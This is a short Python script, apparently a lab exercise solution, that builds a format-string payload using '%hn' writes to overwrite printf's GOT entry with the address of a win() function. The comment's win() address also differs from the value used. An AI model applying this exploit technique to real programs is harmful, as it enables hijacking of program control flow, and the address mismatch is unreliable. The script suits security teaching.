#!/usr/bin/python3
# task3_1: hook got

# got.printf = 0x804c004
addr = 0x804c004
payload =  (addr + 2).to_bytes(4,byteorder='little')
payload += ("abcd").encode('latin-1')
payload += (addr).to_bytes(4,byteorder='little')

# the address of win() = 0x08049196
target = 0x08049186
# Construct the format string
offset1 = 0x0804 - 4*3 - 15*8
offset2 = 0x9186 - 0x0804

payload += ("%.8x" * 15 +
    "%.{}x".format(offset1) + "%hn" +
    "%.{}x".format(offset2) + "%hn"
).encode('latin-1')

# Write the payload to badfile
with open("input", "wb") as f:
  f.write(payload)